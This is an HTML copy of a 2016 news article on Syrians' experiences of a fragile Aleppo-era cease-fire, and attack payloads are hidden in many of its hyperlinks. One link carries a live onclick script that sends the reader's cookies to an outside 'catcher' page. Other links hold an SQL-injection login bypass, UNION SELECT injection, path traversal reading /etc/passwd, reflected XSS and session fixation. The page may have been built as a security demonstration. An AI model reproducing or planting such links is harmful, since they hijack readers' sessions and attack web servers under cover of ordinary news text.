<h2>Rags, Tea and Advice as Syrians Fret Over Cease-Fire</h2>

<p class="details">By ANNE BARNARDSEPT. 15, 2016<a href="#"></a> </p>

<p>
BEIRUT, Lebanon — The weeklong vacation for the Muslim holiday of  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%
271&submit=Login" target="_blank">Eid al-Adha</a> is nearing an end, and the partial cease-fire that began on <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">Monday night</a> is showing signs of fraying.
</p> <p>
In the rebel-held eastern section of Aleppo, Abdelkafi al-Hamdo, a teacher and antigovernment activist, enjoyed the sunset Thursday with friends in an apartment overlooking the city. Hours later, Mr. Hamdo reported that “the truce is going bye-bye” — he said two people, including a friend of his, had been killed by government snipers early Friday morning.

 <p>
Bombardments and clashes were reported in many <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">provinces of Syria,</a> with the government and opposition blaming each other for violating the truce, which was arranged by the United States and Russia.
</p> <p>
“The sounds of explosions are very strong — explosions, gun clashes and ambulances,” said Abu Yaman, 50, who lives in a government-held district of Damascus.
</p> <p>
Also, aid deliveries promised under the agreement were still being held up at the border.
</p> <p>
At a meeting of his <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">National Security Council </a> in Washington on Friday to discuss the campaign against the Islamic State, President Obama told top advisers that he was deeply concerned that the Syrian government was continuing to block the flow of humanitarian aid, the White House said in an official account of the discussion.
</p> <p>
Mr. Obama “emphasized that the United States will not proceed with the next steps in the arrangement with Russia until we see seven continuous days of reduced violence and <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank">sustained humanitarian access,”</a> the statement said.
</p> <p>
Below, Syrians in government controlled cities and rebel-held areas share their thoughts, experiences, videos and photos — and their doubts — as the cease-fire entered its fourth full day on Friday.
</p> <p>

‘It Doesn’t Matter, <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">No One Will Save Us’</a>
</p> <p>
Samsam, 26, an aid worker in the government-held section of Aleppo, ventured out into the western part of the city on Thursday. She asked to be identified by her nickname — it means “sesame” in Arabic — because she was not <a href="http://www.theplanetreports.com/index.php?name=Visitor%3Cscript%3Ealert(%27You%20are%20being%20attacked.%27)%3C/script%3E" target="_blank">authorized by the government </a> to speak to foreign reporters.
</p> <p>
Let me tell you what happened Thursday: I went to my grandma’s home. While I was walking, the street was normal, everyone out, people, children, crowded like usual. But when I passed by a side road, I saw a family  <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">living out on the street,</a> in a tent made of blankets. I saw a girl and woman collecting rags, colored rags.
</p> <p>
I asked her, “Why are you collecting rags?”
</p> <p>
“For cooking and for pillows,” she said.
</p> <p>
I asked, “Did you know about the cease-fire?” and she said, “Yes, I know.”
</p> <p>
I asked her what do you think, and she said: “It’s all a big lie like usual. We went the other day to get food, and we heard explosions in the distance.”
</p> <p>
The saddest part was, she wanted to go to the park and her mother won’t let her. Little tears came into her eyes. She said this is the joy of Eid, but she can’t go, because of the situation, and because they have no home.
</p> <p>
Her mother came and asked me,<a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank"> “Did you take pictures?”</a>
</p> <p>
I said yes.
</p> <p>
She said, “It doesn’t matter, no one will save us or hear us.”
</p> <p>
‘I Wanted Today to Spend My Day Outdoors’
</p> <p>
Abu Marwan, 55, a gas station worker in Damascus, loaded his wife, son, two married daughters and their families into his small white truck on Thursday and drove to Tishreen Park. They spread out a carpet in a shady spot under a tree and arranged a picnic of olives, yogurt, stewed beans and pickled eggplant, and set up pots to cook tea and coffee. Mr. Marwan smoked from his water pipe and chatted over tea.
</p> <p>
All Damascenes like picnics. Before the war, we went every Friday, after the noon prayers, till night. Sometimes we came home at midnight. Usually we hear fighting from nearby neighborhoods. But since the beginning of the  <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">cease-fire, nothing.</a>
</p> <p>
Ali, 28, a government worker who would give only his first name out of fear of talking to a reporter without permission from the government, was sitting under a small tree in a corner of the park, drinking soft drinks with his fiancée. They wanted some privacy from her family.
</p> <p>
We are bored of visiting people’s houses. I wanted today to spend my day outdoors with my fiancée. It is much cheaper to come to a free park than going to a restaurant or coffee shop. Everyone is happy with the cease-fire. But I don’t think it will last long. The armed groups have no single command to control them, and the government forces have the authority to attack the <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three" target="_blank">Nusra Front and Daesh</a> — which means there is no real, clear and comprehensive cease-fire.
</p> <p>
Indeed, the cease-fire doesn’t cover attacks on the Islamic militants of the Qaeda-allied Nusra Front or Daesh, another name for the Islamic State. And the internecine conflict and Syria’s history of failed cease-fires have many civilians worried that this week’s minor reprieve will not last.
</p> <p>
‘Continue Until the End, or Stop Now’
</p> <p>
Jalal al-Telawi, 36, a computer technician and an activist in Waer, the last rebel-held enclave in the central city of Homs, said he was growing anxious. He endured two years in the Old City besieged by government forces before finding refuge in Waer.
</p> <p>
I’m not 100 percent sure the regime will let us enjoy this quietness. For the past few days I had dreams or nightmares of the green buses evacuating us. The regime released 194 prisoners in the past few days; about 200 fighters and their families are expected to be evacuated later in a deal.
</p> <p>
Mr. Telawi said he wondered how long he and his family could survive in Syria, recalling his father’s predictions in 2011, when the uprising began.
</p> <p>
My father asked his five sons, who all became activists later, to come over and give us this advice, which I will never forget: “Listen boys, you have to wait at least 10 years until this revolution bears fruit. If you want to join the revolution you have to continue until the end, or stop now.”
</p> <p>
My father knows the regime very well. Of course, back then I never thought it will take that long to topple Assad. I told my father, “Look what happened to Qaddafi and Mubarak. A few months and Bashar will be gone.” But my father insisted that we take our pledge to continue until the end — or leave now.
